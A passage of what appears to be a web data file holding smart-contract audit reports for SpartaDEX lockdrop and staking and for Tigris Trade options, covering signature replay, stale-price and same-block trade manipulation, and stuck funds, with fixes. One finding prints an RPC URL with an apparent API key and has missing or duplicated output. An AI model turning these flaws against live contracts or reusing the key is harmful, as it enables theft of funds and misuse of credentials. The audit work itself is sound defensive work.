keccak256(abi.encodePacked("\\x19\\x01", DOMAIN_SEPARATOR, structHash));\r\n        }\r\n```\r\n\r\n### [L-6] Inconsistency in LiquidityProvided event parameters\r\n\r\n**Context:** [LockdropPhase1.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L120-L125)\r\n\r\n**Impact**\r\n\r\nThe inconsistent usage of event parameters in the\xa0`LiquidityProvided`\xa0event can lead to confusion and incorrect data representation\r\n\r\n**Description**\r\n\r\nThe code snippet presents an inconsistency in the usage of event parameters for the\xa0`LiquidityProvided`\xa0event. The event declaration in the\xa0`ILockdropPhase1`\xa0contract defines the last parameter as\xa0`duration`, indicating the duration of the liquidity provision. However, in the\xa0`LockdropPhase1`\xa0contract, when the event is emitted, the last parameter is used to represent the\xa0`_value`, which does not align with the expected parameter.\r\n\r\n**For this event, the last parameter is duration**\r\n\r\n```solidity\r\n        event LiquidityProvided(\r\n            address indexed by,\r\n            IUniswapV2Pair indexed pair,\r\n            uint32 indexed durationIndex,\r\n            uint256 duration\r\n        );\r\n```\r\n\r\nHowever, here we receive value instead as a last parameter\r\n\r\nhttps://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L120-L125\r\n\r\n```solidity\r\n        emit LiquidityProvided(\r\n            msg.sender,\r\n            token,\r\n            _lockingExpirationTimestampIndex,\r\n            _value\r\n        );\r\n```\r\n\r\n**Recommendation**\r\n\r\nConsider the following recommendations:\r\n\r\n1.  Update the event declaration in the\xa0`ILockdropPhase1`\xa0contract to match the usage in the\xa0`LockdropPhase1`\xa0contract. If the last parameter represents the\xa0`_value`, revise the event declaration to reflect this.\r\n2.  Alternatively, if the intended usage is to represent the duration, modify the event emission in the\xa0`LockdropPhase1`\xa0contract to include the correct duration value instead of\xa0`_value`.',pdfLink:"https://github.com/bytes032/reports/blob/main/SPD-Lockdrop.pdf"},{slug:"spdstaking",title:"SpartaDEX Staking",description:"SpartaDEX is a combination of real-time strategy game set in the realities of ancient Greece and a decentralized cryptocurrency exchange. They call it a gamified DEX. The main goal is to provide the exchange with user engagement known from video games, which builds loyalty and consistency in providing liquidity.",createdAt:"2023-06-06T03:52:32.356Z",findings:6,body:'---\r\n\r\n# Findings\r\n\r\n## Critical Risk\r\n\r\n### [C-1] Replay attack in PolisManagers upgradeWithSignature\r\n\r\n**Context:** [PolisManager.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/2588db7d10bec32bf9b178107c923899154d1c98/contracts/PolisManager.sol#L39-L54)\r\n\r\n**Impact:** The lack of checks for signature reuse in the `upgradeWithSignature` function presents a vulnerability that can lead to indefinite token upgrades.\r\n\r\n**Description:** The `upgradeWithSignature` function in PolisManager contract is used to upgrade a locked token. However, this function doesn\'t enforce any checks to prevent the reuse of a previously used signature.\r\n\r\n```solidity\r\n  function upgradeWithSignature(\r\n        uint256 tokenId,\r\n        uint8 level,\r\n        bytes calldata signature\r\n    ) external override {\r\n        bytes32 messageHash = upgradeHash(tokenId, level);\r\n        address signer = messageHash.toEthSignedMessageHash().recover(\r\n            signature\r\n        );\r\n        _ensureHasUpgradeRole(signer);\r\n        // @audit-issue signature replay attack\r\n        if (polis.lockerOf(tokenId) != address(this)) {\r\n            revert OnlyIfLocked();\r\n        }\r\n        polis.upgrade(tokenId);\r\n    }\r\n```\r\n\r\nThis presents a significant risk, as once a signature has been used, it can be reused indefinitely to perform multiple upgrades on a token.\r\n\r\nAdditionally, the lack of an expiry mechanism for the signature is a minor concern, as it leaves the signature indefinitely valid, thereby extending the period of vulnerability.\r\n\r\n**Recommendation**\r\n\r\n1. **Implement Signature Tracking**: To mitigate the risk of replay attacks, implement a mechanism to track used signatures. For instance, you could use a mapping to store used signatures and check against this mapping whenever the `upgradeWithSignature` function is called. If a signature is found in the mapping, the function should revert to prevent the upgrade.\r\n\r\n```solidity\r\nmapping (bytes => bool) usedSignatures;\r\n\r\nfunction upgradeWithSignature(\r\n    uint256 tokenId,\r\n    uint8 level,\r\n    bytes calldata signature\r\n) external override {\r\n    require(!usedSignatures[signature], "Signature has already been used");\r\n    // ...\r\n    usedSignatures[signature] = true;\r\n}\r\n```\r\n\r\n2. **Add Expiry to Signature**: Introduce a mechanism to set an expiry for the signatures. The `upgradeHash` could be modified to include an expiry timestamp and the `upgradeWithSignature` function should check whether the signature has expired.\r\n\r\n## High Risk\r\n\r\n### [H-1] Unclaimed tokens remain stuck in SpartaStaking smart contract\r\n\r\n**Context:** [SpartaStaking.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/0369f48e3b2a655616dc75afdf87b9915f64d720/contracts/staking/SpartaStaking.sol#L80-L82)\r\n\r\n**Impact**\r\n\r\nA significant amount of tokens (1 token per second over the duration of 1 hour in the provided example) remains stuck in the contract indefinitely. This unclaimed portion could grow substantial over time if there are delays in staking after the `initialize(...)` function is called. This **will** result in loss of funds for the stakeholders.\r\n\r\n**Description:** In the current implementation of the `SpartaStaking` contract, a vulnerability exists where tokens meant for staking rewards may become irretrievable and stuck within the contract.\r\n\r\nLet’s consider that you have a\xa0`SpartaStaking`\xa0contract with a reward duration of one month seconds (2592000):\r\n\r\nYou call\xa0`initialize(...)`\xa0with a reward of one month seconds (2592000) only.\xa0**The intention**\xa0is for a period of a month, 1 reward token per second should be distributed to stakers.\r\n\r\nThe initial state is:\r\n`rewardRate = 1`\r\n`duration = 2592000`\r\n`start = 1686483210`\r\n`updatedAt = start`\r\n`finishAt() = 1689075210 = (1686483210  + 2592000)`\r\n\r\nThen, 1 hour (3600) passes and the first staker calls `stake(...)` to stake some amount.\r\n\r\nAt this call, `rewardPerToken is 0`, because there there are no other stakers.\r\n\r\nhttps://github.com/SpartaDEX/sdex-smart-contracts/blob/0369f48e3b2a655616dc75afdf87b9915f64d720/contracts/staking/SpartaStaking.sol#L80-L82\r\n\r\n```solidity\r\n        if (totalSupply == 0 || block.timestamp < start) {\r\n            return rewardPerTokenStored;\r\n        }\r\n```\r\n\r\nAnd now `updatedAt = 1686486810` (1 hour after start)\r\n\r\nHence, for this staker, the clock starts from now, and he or she will accumulate rewards from this point.\r\n\r\n```solidity\r\n (rewardRate * (lastTimeRewardApplicable() - updatedAt) * 1e18) /\r\n```\r\n\r\nAs a result 2592000-3600= 2588400 tokens will be distributed, and these 3600 tokens will be stuck in the contract **forever** because there\'s no token recovery function.\r\n\r\n**Recommendation:** To mitigate this issue, I recommend one of the two approaches:\r\n\r\n1. **Setting an "End" Time:** Instead of starting the rewards distribution immediately upon initialization, consider a model where the "end" time is defined and the rewards distribution starts only when the first `stake(...)` function is called. This ensures that no tokens will be left unclaimed.\r\n2. **Implement a Recovery Function:** If the first solution doesn\'t fit into the overall design, an alternative is to implement a recovery function that allows the contract owner to retrieve unclaimed tokens after a certain period. This would ensure the stuck tokens can be put back into circulation.\r\n\r\n### [H-2] Unintended excess funds retention in WithFees contract\r\n\r\n**Context:** [WithFees.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/a628ffc81866c12219387e9ba39ab5d53b481809/contracts/WithFees.sol#L26-L34)\r\n\r\n**Impact:** Users who send more funds than the required fee are susceptible to an unintended loss of their excess funds. The contract does not refund the surplus funds, effectively causing the users to pay higher fees than necessary.\r\n\r\n**Description:** The `WithFee\'s` contract in question employs a modifier called `onlyWithFees`, which is used to enforce native coin fees on certain functions across Staking/Vesting contracts. The modifier employs a local variable named `value` that is compared against `msg.value`, which represents the amount of native coins sent by the sender.\r\n\r\n```solidity\r\n\r\n    modifier onlyWithFees() {\r\n        if (value > msg.value) {\r\n            revert OnlyWithFees();\r\n        }\r\n\r\n        // @audit-issue doesn\'t refund\r\n        _;\r\n    }\r\n```\r\n\r\nAs seen in the code above, if the sender sends an amount less than the value, the modifier will revert the transaction.\r\n\r\nHowever, if the sender sends an amount greater than the required fee (`value`), the contract does not handle the excess funds sent, and they are effectively locked within the contract. This means that a user who inadvertently sends too much will suffer a loss.\r\n\r\n**Recommendation:** To rectify this issue, the contract should either refund the excess amount sent by the sender or enforce strict equality between the `value` and `msg.value`. Implementing either of these solutions will prevent users from unintentionally losing funds.\r\n\r\nOption 1: Returning the excess funds\r\n\r\n```solidity\r\nmodifier onlyWithFees() {\r\n    if (value > msg.value) {\r\n        revert OnlyWithFees();\r\n    }\r\n    if (value < msg.value) {\r\n        // Refund the excess amount\r\n        payable(msg.sender).transfer(msg.value - value);\r\n    }\r\n\r\n    _;\r\n}\r\n```\r\n\r\nOption 2: Requiring strict equality\r\n\r\n```solidity\r\nmodifier onlyWithFees() {\r\n    if (value != msg.value) {\r\n        revert OnlyWithFees();\r\n    }\r\n\r\n    _;\r\n}\r\n```\r\n\r\n## Medium Risk\r\n\r\n### [M-1] EIP712 compliance issue in PaymentReceiver.sol\r\n\r\n**Context:** [PaymentReceiver.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/2588db7d10bec32bf9b178107c923899154d1c98/contracts/payment-receiver/PaymentReceiver.sol#L75-L105)\r\n\r\n**Impact:** The non-compliance with EIP712 standards in PaymentReceiver.sol could lead to improper domain separation and incorrect hashing of variables. This may result in unexpected behaviour\r\n\r\n**Description:** PaymentReceiver.sol\'s buyGemsHash function is designed to allow users buy wallet tolkens if the signature is signed by a wallet with GAMES_TRADER role.\r\n\r\nIt also incorporates EIP712. However, its current implementation is **NOT** EIP712 compliant.\r\n\r\n```solidity\r\n function buyGemsHash(\r\n        address _wallet,\r\n        uint256 _tokenId,\r\n        uint256 _amount,\r\n        uint256 _price,\r\n        uint256 _deadline\r\n    ) public view override returns (bytes32) {\r\n        return\r\n            keccak256(\r\n                abi.encodePacked(\r\n                    uint16(0x1901),\r\n                    keccak256(\r\n                        abi.encode(\r\n                            keccak256(\r\n                                "EIP712Domain(string name, string version, address verifyingContract, uint256 signedAt)"\r\n                            ),\r\n                            keccak256(bytes("SPARTA")),\r\n                            keccak256(bytes("1")),\r\n                            _chainId(),\r\n                            address(this),\r\n                            keccak256(bytes("SPARTA_GENS"))\r\n                        )\r\n                    ),\r\n                    _wallet,\r\n                    _tokenId,\r\n                    _amount,\r\n                    _price,\r\n                    _deadline\r\n                )\r\n            );\r\n    }\r\n```\r\n\r\nThere are two problems. First, the domain separator is wrong, its supposed to be\r\n`"EIP712Domain(string name, string version, address verifyingContract, uint256 signedAt)"`\r\n\r\nbut the variables that are passed are "string(name), string(version), uint(chainId), address, string(salt)"\r\n\r\nWhereas, as per EIP712 the ordering is different.\r\n\r\nThe second problem is that the gems hash variables are hashed incorrectly. These https://github.com/SpartaDEX/sdex-smart-contracts/blob/2588db7d10bec32bf9b178107c923899154d1c98/contracts/payment-receiver/PaymentReceiver.sol#L94-L98\r\n\r\n```solidity\r\n                    _wallet,\r\n                    _tokenId,\r\n                    _amount,\r\n                    _price,\r\n                    _deadline\r\n```\r\n\r\nNote: `PolisManager` has the same issue related to the domain separator.\r\n\r\n**Recommendation:**\r\n\r\n1. **Fix the Domain Separator**: The domain separator should be corrected to match the EIP712 standard. The corrected keccak256 function should be:\r\n\r\n```solidity\r\nkeccak256( "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)" );\r\n```\r\n\r\n2. **Fix the Encoded Data**: The hashing of the gems variables should be corrected to match the EIP712 standard. An example of the correct implementation can be found [here](https://github.com/ethereum/EIPs/blob/master/assets/eip-712/Example.sol#L65)\r\n\r\n## Low Risk\r\n\r\n### [L-1] Mismatch in UPGRADE_TYPE hash parameters in PolisManagers upgradeHash function\r\n\r\n**Context:** [PolisManager.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/2588db7d10bec32bf9b178107c923899154d1c98/contracts/PolisManager.sol#L11-L12)\r\n\r\n**Impact:** This issue may lead to improper calculation of the hash and can affect the intended functionality of the contract. It might not have immediate severe consequences, but if users hash on their own instead of using "upgradeHash", this would result in invalid hashes.\r\n\r\n**Description:** There is a discrepancy between the parameters defined in the `UPGRADE_TYPE` hash and the actual parameters passed to the `upgradeHash` function in the PolisManager contract. The `UPGRADE_TYPE` hash is defined to include three variables: `tokenId`, `level`, and `signature`.\r\n\r\n```solidity\r\n    string constant UPGRADE_TYPE =\r\n        "upgrade(uint256 tokenId, uint8 level, bytes signature)";\r\n```\r\n\r\nHowever, the `upgradeHash` function, which is supposed to use this type hash, is only called with two parameters - `tokenId` and `level`.\r\n\r\n```solidity\r\n    function upgradeHash(\r\n        uint256 tokenId,\r\n        uint8 level\r\n    ) public view override returns (bytes32) {\r\n```\r\n\r\n**Recommendation:** The `UPGRADE_TYPE` constant should be updated to reflect the actual parameters that are passed to the `upgradeHash` function. Specifically, the `signature` parameter should be removed from the `UPGRADE_TYPE` constant. This will ensure that the type hash correctly represents the parameters being passed.\r\n\r\n```solidity\r\nstring constant UPGRADE_TYPE = "upgrade(uint256 tokenId, uint8 level)";\r\n```\r\n\r\n### [L-2] Unhandled failures in token transfer operations\r\n\r\n**Context:** [PolisMinter.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/2588db7d10bec32bf9b178107c923899154d1c98/contracts/tokens/PolisMinter.sol#L56-L64), [SpartaRewardLPLinearStaking.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/2588db7d10bec32bf9b178107c923899154d1c98/contracts/staking/SpartaRewardLpLinearStaking.sol#L40-L42), [LinearStaking.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/2588db7d10bec32bf9b178107c923899154d1c98/contracts/staking/LinearStaking.sol#L126-L128)\r\n\r\n**Impact:** This vulnerability has a low severity rating. While it does not lead to the direct loss of funds or manipulation of contract logic, it can hinder expected contract behavior when interacting with certain ERC20 tokens, like USDT.\r\n\r\n**Description:** There are several instances in the `PolisMinter.sol`, `SpartaRewardLPLinearStaking.sol`, and `LinearStaking.sol` contracts where `transfer` and `transferFrom` are utilized to move tokens. These operations check if the transfer operation returns true or false and revert the transaction if the operation returns false. For example:\r\n\r\n```solidity\r\n      if (\r\n            !paymentToken.transferFrom(\r\n                msg.sender,\r\n                address(paymentReceiver),\r\n                paymentValue\r\n            )\r\n        ) {\r\n            revert PaymentFiled();\r\n        }\r\n```\r\n\r\n```solidity\r\n if (!rewardToken.transfer(msg.sender, toTransfer)) {\r\n            revert TransferFailed();\r\n        }\r\n```\r\n\r\n```solidity\r\n        if (!rewardToken.transfer(msg.sender, reward)) {\r\n            revert TransferFailed();\r\n        }\r\n```\r\n\r\nHowever, this method is incompatible with certain tokens, like USDT. The reason is that the USDT contract does not return a boolean value after a transfer operation, and thus does not comply with the common ERC20 interface. Therefore, the aforementioned code segments would always revert when dealing with USDT, which would result in the failure of legitimate operations.\r\n\r\n**Recommendation:** In order to avoid this issue and provide compatibility with a wider range of tokens, it is recommended to use the `safeTransfer` and `safeTransferFrom` functions provided by the OpenZeppelin library. These functions ensure that the transfer operation behaves as expected, by reverting the transaction if the transfer fails, even if the token contract does not return a boolean value. Thus, these functions would work correctly with all tokens that follow the ERC20 standard, including those that do not strictly comply with the common interface.',pdfLink:"https://github.com/bytes032/reports/blob/main/SPD-Staking.pdf"},{title:"Tigris Trade Options",slug:"ttoptions",description:"Tigris Trade is a leveraged trading platform that utilizes price data signed by oracles off-chain to provide atomic trades and real-time pair prices. Open positions are minted as NFTs, making them transferable. Tigris is governed by Governance NFT holders. The oracle aggregates real-time spot market prices from CEXs and sign them. Traders include the price data and signature in the trade txs. For people that want to provide liquidity, they can lock up tigAsset tokens (such as tigUSD, received by depositing the appropriate token into the stablevault) for up to 365 days. They will receive trading fees through an allocation of Governance NFTs, which get distributed based on amount locked and lock period.",findings:9,createdAt:"2023-05-27T03:52:32.356Z",body:'---\r\n\r\n# Findings\r\n\r\n## Critical Risk\r\n\r\n### [C-1] Limit order expiry time flaw could lead to loss of funds\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L256-L262)\r\n\r\n**Impact**\r\n\r\nThe vulnerability discovered could lead to significant financial loss for users. In the event that an order is not executed within its specified duration, it can still be executed after the expiry time. This execution could be at an unfavorable price, leading to direct loss of funds.\r\n\r\n**Description**\r\n\r\nRight now, a limit order can be initiated with a specific duration, which respectively populates the `expires` variable when the trade is [minted](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/TradeNFT.sol#L105-L107).\r\n\r\n```solidity\r\n        newTrade.duration = _mintTrade.duration;\r\n        newTrade.openPrice = _mintTrade.price;\r\n        newTrade.expires = _mintTrade.duration + block.timestamp;\r\n```\r\n\r\nThis variable is crucial, because it\'s used in `closeTrade` to ensure that the trade can only be closed when it\'s duration has expired.\r\n\r\n```solidity\r\n        if (block.timestamp < _trade.expires) revert("!expired");\r\n```\r\n\r\nFor instance, let\'s consider the following steps:\r\n\r\n1.  A user initiates a limit order with a `duration = x`, setting the `expiry = x + block.timestamp`.\r\n2.  For some reason, the order cannot be executed for the whole duration, e.g., it enters into one of the `if (trade.openPrice > _price) revert("!limitPrice");` conditions.\r\n3.  When the expiry time has passed, the order can now be executed. As soon as it gets executed, it can immediately be closed, because the condition `if (block.timestamp < _trade.expires) revert("!expired");` no longer holds.\r\n4.  Depending on the asset\'s price at the time of execution, this will lead to a direct loss of funds.\r\n\r\n**Recommendation**\r\n\r\nTo address this vulnerability, it\'s advised to refactor the function so that `initiateLimitOrder` sets `expires` to 0, irrespective of the duration. Then, `expires` should be updated when the order is executed. This change would prevent orders from being executed after their duration has expired.\r\n\r\nFurthermore, it would be beneficial to enforce a minimum duration (e.g., 30 seconds). This would provide a buffer to prevent the immediate execution and closure of trades, allowing users to react to market changes.\r\n\r\n### [C-2] Its possible to open a trade in the same tx with two different prices\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L315)\r\n\r\nTigris utilizes oracle nodes which are connected to the [Pythnet](https://pyth.network) price feed. The asset prices and other related data is signed and broadcasted directly to Tigris users, which is used to place market orders. This data consists of:\r\n\r\n-   Asset price\r\n-   Spread\r\n-   Timestamp\r\n-   Node address\r\n-   Market open/closed status\r\n-   Oracle signature\r\n\r\nUpon placing a trade, price data and signature is included in the transaction input parameters, where the validity of the data and the signatures are verified on-chain.\r\n\r\nThis means there could be two different prices in the "valid signature pool" at the same time.\r\n\r\nIn `Options.sol`, the price of the asset is fetched through `getVerifiedPrice`\r\n\r\n```solidity\r\n        _price = _priceData.price;\r\n        _spread = _priceData.spread;\r\n\r\n        if(_withSpreadIsLong == 1 && useSpread)\r\n            _price += _price * _spread / DIVISION_CONSTANT;\r\n        else if(_withSpreadIsLong == 2 && useSpread)\r\n            _price -= _price * _spread / DIVISION_CONSTANT;\r\n```\r\n\r\nIf a spread is set, it will update the price according to that, e.g. if price is 1000 and spread is 0.1% the long trades will open with price 1001 and short trades will open with price 999.\r\n\r\nOtherwise, it will just return the price as is.\r\n\r\nWhen you open a trade, you can specify duration, which is then derived to set the expiration of the trade.\r\n\r\n```solidity\r\n>       newTrade.duration = _mintTrade.duration;\r\n        newTrade.openPrice = _mintTrade.price;\r\n>        newTrade.expires = _mintTrade.duration + block.timestamp;\r\n```\r\n\r\nThen, when closing a trade the `expiry` variable is used to ensure that only trades which expired can be closed.\r\n\r\n```solidity\r\n function closeTrade(\r\n        uint256 _id,\r\n        PriceData calldata _priceData,\r\n        bytes calldata _signature\r\n    )\r\n        external\r\n    {\r\n    ...\r\n\r\n>     if (block.timestamp < _trade.expires) revert("!expired");\r\n    ...\r\n```\r\n\r\nThe catch here is that as per Arbitrum\'s [docs](https://github.com/OffchainLabs/arbitrum/blob/master/docs/Time_in_Arbitrum.md#ethereum-block-numbers-within-arbitrum), any timing assumptions a contract makes about block numbers and timestamps should be considered generally reliable in the longer term (i.e., on the order of at least several hours) but unreliable in the shorter term (minutes)\r\n\r\nIt is unreliable in a shorter term, because if multiple Arbitrum transactions are in a single L1 block, they **will** have the same block.timestamp.\r\n\r\nThis means around 20 transactions in Arbitrum can have the same block timestamp.\r\n\r\nRunning\r\n\r\n```bash\r\ncast block --rpc-url https://arb-mainnet.g.alchemy.com/v2/UVXidxBjyLOdMXEJxYtCMqqEkHATR2gQ 17169970\r\n```\r\n\r\nThen, running the script for 20 blocks further\r\n\r\n```bash\r\ncast block --rpc-url https://arb-mainnet.g.alchemy.com/v2/UVXidxBjyLOdMXEJxYtCMqqEkHATR2gQ 17169970\r\n```\r\n\r\nYields the following result:\r\n\r\nThis proves that 20 distinct transactions in Arbitrum can have the same timestamp.\r\n\r\nBack to openTrade and closeTrade, this essentially means a user can open/close trade in the same **L1 block**.\r\n\r\nConsider the following scenario:\r\n\r\n1. useSpread is not set, so the oracle returns the price as is.\r\n2. Amelie opens a trade with where `duration = 0` and `collateral = 1e18` and she picks price X from the pool. Because duration is set to 0, this means expiry = block.timestamp.\r\n3. Immediately, in the same or after the first transaction, she closes her trade, which is possible because `block.timestamp == trade.expiry`, but now picks price Y from the pool, where Y > X.\r\n4. $\r\n\r\nPicking a different price from the pool is possible, because anyone can get signed prices. Additionally, the price **timestamp** is not chain dependant, but is generated from the node that is signing the prices.\r\n\r\nHence, the check below will pass for ~20-25 blocks in Arbitrum, because the block.timestamp will be the same, allowing the user to either open/close trades in the same transaction, or do it sequentially, while picking a more favorable price for the closing trade.\r\n\r\n```solidity\r\nfunction getVerifiedPrice(\r\n        uint256 _asset,\r\n        PriceData calldata _priceData,\r\n        bytes calldata _signature,\r\n        uint256 _withSpreadIsLong,\r\n        bool _expirable\r\n    )\r\n        public view\r\n        returns(uint256 _price, uint256 _spread)\r\n    {\r\n        ...\r\n        if(_expirable) require(block.timestamp <= _priceData.timestamp + _validSignatureTimer, "ExpSig");\r\n        ....\r\n```\r\n\r\n**Recommendation:** Update the condition in the `closeTrade` function to prevent a trade from being closed within the same L1 block. You can achieve this by adding a condition to check if the current `block.timestamp` is greater than `_trade.expires`. Here is the suggested change:\r\n\r\n```diff\r\n+     if (block.timestamp <= _trade.expires) revert("!expired");\r\n```\r\n\r\nThis modification will inhibit the possibility of making profitable transactions by opening and closing a trade within the same block using two different prices from the "valid signature pool".\r\n\r\n### [C-3] Price validation vulnerability in closeTrade\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L315)\r\n\r\n**Impact:** This vulnerability could lead to the manipulation of trade outcomes by the users, potentially allowing them to win trades unfairly. As such, it could undermine the integrity of the trading system and expose the Tigris-Trade platform to reputational damage and potential financial losses.\r\n\r\n**Description:** The `closeTrade` function in the Tigris-Trade `Options.sol` contract currently bypasses price expiration checks, enabling users to close trades with potentially stale price data. This is made possible because the `getVerifiedPrice` function call within `closeTrade` has the `_expirable` parameter set to `false`. This means that the timestamp of the price data is not being checked against the current block timestamp.\r\n\r\nThis could allow users to open a trade at the current price and then close it with a potentially outdated price, essentially gaming the system. In the context of a price expiration condition that should typically prevent this, this can be considered a major security oversight.\r\n\r\nThe vulnerable code is located here:\r\n\r\n```solidity\r\n(uint256 _price,) = getVerifiedPrice(_trade.asset, _priceData, _signature, 0, false);\r\n```\r\n\r\nIn practice, this means a user can open a trade with whatever the current price is and then select a price that could be days old, but one that will consider the trade as a win.\r\n\r\n```solidity\r\n       bool isWin;\r\n        if (_trade.direction && _price > _trade.openPrice) {\r\n            isWin = true;\r\n        } else if(!_trade.direction && _price < _trade.openPrice) {\r\n            isWin = true;\r\n        }\r\n```\r\n\r\n**Recommendation:** To mitigate this vulnerability, it\'s recommended to activate the price expiration checks in the `closeTrade` function. This could be done by setting the `_expirable` parameter to `true` when calling the `getVerifiedPrice` function in `closeTrade`.\r\n\r\nThe updated code should be as follows:\r\n\r\n````solidity\r\n(uint256 _price,) = getVerifiedPrice(_trade.asset, _priceData, _signature, 0, true);\r\n\r\n\r\n\r\n## High Risk\r\n\r\n\r\n### [H-1] OpenInterest can grow infinitely\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L48)\r\n\r\n**Impact:** This issue could lead to a perpetual increase in openInterest for a specific traded asset without an appropriate mechanism to decrease it upon trade closure. This flaw can lead to permanent locking of an asset from trading, disrupting the normal operations of the contract and impacting the platform\'s liquidity and usability.\r\n\r\n**Description**\r\n\r\nThe `TradedAsset` struct within `Options.sol` is employed to whitelist assets for options trading, setting critical parameters and constraints for such trades.\r\n\r\n```solidity\r\n    struct TradedAsset {\r\n        uint maxCollateral;\r\n        uint minCollateral;\r\n        uint maxDuration;\r\n        uint minDuration;\r\n        uint maxOpen;\r\n        uint openInterest;\r\n        uint assetId;\r\n        uint winPercent;\r\n        uint closeFee;\r\n        uint botFee;\r\n        uint refFee;\r\n    }\r\n````\r\n\r\nDuring the execution of a new trade or a limit order, the `openInterest` is properly increased:\r\n\r\n```solidity\r\nasset.openInterest += _tradeInfo.collateral;\r\n```\r\n\r\n```solidity\r\n        TradedAsset storage asset = tradedAssets[trade.asset];\r\n        asset.openInterest += trade.collateral;\r\n```\r\n\r\nThis is crucial to ensure that the next open trades/limit orders won\'t exceed the maximum allowed open orders for that specific asset in both `openTrade` and `executeLimitOrder`\r\n\r\n```solidity\r\n    function openTrade(\r\n        TradeInfo calldata _tradeInfo,\r\n        PriceData calldata _priceData,\r\n        bytes calldata _signature,\r\n        ERC20PermitData calldata _permitData,\r\n        address _trader\r\n    )\r\n        external\r\n    {\r\n        _validateProxy(_trader);\r\n        TradedAsset storage asset = tradedAssets[_tradeInfo.asset];\r\n\r\n        // asset.openInterest is 0 on creation\r\n        require(asset.openInterest + _tradeInfo.collateral <= asset.maxOpen, "!maxOpen");\r\n        require(_tradeInfo.collateral <= asset.maxCollateral, "!max");\r\n        require(_tradeInfo.collateral >= asset.minCollateral, "!min");\r\n```\r\n\r\n```solidity\r\n    function initiateLimitOrder(\r\n        TradeInfo calldata _tradeInfo,\r\n        uint256 _orderType, // 1 limit, 2 stop\r\n        uint256 _price,\r\n        ERC20PermitData calldata _permitData,\r\n        address _trader\r\n    )\r\n        external\r\n    {\r\n        TradedAsset storage asset = tradedAssets[_tradeInfo.asset];\r\n        require(asset.openInterest + _tradeInfo.collateral <= asset.maxOpen, "!maxOpen");\r\n        require(_tradeInfo.collateral <= asset.maxCollateral, "!max");\r\n        require(_tradeInfo.collateral >= asset.minCollateral, "!min");\r\n\r\n```\r\n\r\nHowever, the contract doesn\'t provide a corresponding decrement operation when a trade is closed. This omission allows `openInterest` to grow indefinitely until it reaches the `maxOpen` limit, which blocks any new trades for that asset.\r\n\r\n**Recommendation:** It is recommended to decrement the `openInterest` value appropriately when a trade is closed. The following change should be made to decrease `openInterest` by the amount of the trade\'s collateral before the token for the position is burned:\r\n\r\n```diff\r\n+        _tradedAsset.openInterest -= _trade.collateral;\r\n        tradeNFT.burn(_id);\r\n        emit TradeClosed(_id, _price, isWin ? _tradedAsset.winPercent : 0, toSend, _trade.trader, _msgSender());\r\n```\r\n\r\n### [H-2] A malicious user can open orders exceeding the maximum possible amount\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L198-L211)\r\n\r\n**Impact:** This vulnerability can lead to a significant imbalance in the platform\'s liquidity management. It allows a malicious user to overcommit resources, potentially destabilizing the system by surpassing the `maxOpen` limit set for an asset.\r\n\r\n**Description:** The described vulnerability lies within the `initiateLimitOrder` function, which initiates limit orders based on the current `openInterest` of the asset. However, the current design does not immediately update the `openInterest` at the time of initiating an order.\r\n\r\n```solidity\r\n    function initiateLimitOrder(\r\n        TradeInfo calldata _tradeInfo,\r\n        uint256 _orderType, // 1 limit, 2 stop\r\n        uint256 _price,\r\n        ERC20PermitData calldata _permitData,\r\n        address _trader\r\n    )\r\n        external\r\n    {\r\n        TradedAsset storage asset = tradedAssets[_tradeInfo.asset];\r\n        require(asset.openInterest + _tradeInfo.collateral <= asset.maxOpen, "!maxOpen");\r\n        require(_tradeInfo.collateral <= asset.maxCollateral, "!max");\r\n        require(_tradeInfo.collateral >= asset.minCollateral, "!min");\r\n\r\n```\r\n\r\nInstead, it is updated at a later stage when executing the order.\r\n\r\n```solidity\r\n        TradedAsset storage asset = tradedAssets[trade.asset];\r\n        asset.openInterest += trade.collateral;\r\n```\r\n\r\nThe problem arises from the fact that when several orders are initiated simultaneously before execution, the check is performed on the same, stale `openInterest` value.\r\n\r\nAs a result, a user can initiate multiple limit orders which, collectively, would exceed the `maxOpen` limit set for the asset. This situation is not prevented, as each check when initiating an order only considers the `openInterest` at the moment of initiating the order, ignoring subsequent changes due to other orders.\r\n\r\nThis scenario can be illustrated as follows:\r\n\r\n1.  Assume `maxOpen = 5e18` and `openInterest = 0`.\r\n2.  In a single transaction, Amelie initiates 5 limit orders with 5e18 collateral each.\r\n3.  Each `initiateLimitOrder` call passes the check, as it is performed with the stale `openInterest` value.\r\n4.  Amelie then executes these 5 transactions, resulting in `openInterest = 25e18`, which significantly exceeds the `maxOpen` limit set by the protocol.\r\n\r\n**Recommendation:** To mitigate this vulnerability, the `openInterest` variable should be updated in real-time as each order is initiated, not at the point of execution. This way, each subsequent `initiateLimitOrder` check would consider the most recent `openInterest` value, including all initiated but not yet executed orders.\r\n\r\nAlternatively, if the protocol insists to use the current approach, the following checks should be performed right before execution again:\r\n\r\n```solidity\r\n        require(asset.openInterest + _tradeInfo.collateral <= asset.maxOpen, 